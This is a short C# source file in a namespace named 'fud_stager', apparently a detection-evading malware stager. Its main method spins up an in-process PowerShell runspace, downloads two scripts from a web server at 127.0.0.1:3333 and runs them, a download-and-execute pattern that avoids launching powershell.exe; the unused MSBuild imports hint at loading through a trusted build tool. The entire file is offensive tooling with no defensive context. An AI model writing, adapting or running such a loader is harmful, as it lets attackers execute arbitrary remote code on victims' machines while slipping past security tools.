using System;
using System.Net;
using System.Text;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Management.Automation.Runspaces;
using PowerShell = System.Management.Automation.PowerShell;

namespace fud_stager
{
    class Program
    {
        static void Main(string[] args)
        {
			PowerShell Ps_instance = PowerShell.Create();

			WebClient myWebClient = new WebClient();

			var script1 = myWebClient.DownloadString("http://127.0.0.1:3333/script1.txt");
			var script2 = myWebClient.DownloadString("http://127.0.0.1:3333/script2.txt");


			Ps_instance.AddScript(script1);
			Ps_instance.AddScript(script2);
			Ps_instance.AddCommand("out-string");
			Ps_instance.Invoke();
		}
    }
}
